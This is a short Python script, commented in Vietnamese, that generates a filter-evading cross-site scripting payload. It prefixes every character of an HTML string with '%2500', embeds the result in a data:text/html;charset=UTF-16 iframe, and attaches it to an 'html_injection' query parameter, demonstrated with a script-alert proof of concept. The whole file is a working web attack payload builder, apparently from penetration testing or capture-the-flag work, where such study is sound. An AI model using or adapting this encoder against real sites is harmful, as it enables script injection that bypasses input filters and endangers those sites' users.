def to_utf16_percent00_payload(html_str: str) -> str:
    """
    Trả về chuỗi đã chèn %2500 trước MỖI ký tự,
    dùng cho data:text/html;charset=UTF-16,...
    """
    return "".join("%2500" + ch for ch in html_str)

def build_iframe_param(inner_html: str) -> str:
    encoded = to_utf16_percent00_payload(inner_html)
    iframe = f"<iframe src=\"data:text/html;charset=UTF-16,{encoded}\"></iframe>"
    return f"?html_injection={iframe}"

# ---- Ví dụ dùng ----
inner = "<script>alert(1)</script>"
print(build_iframe_param(inner))

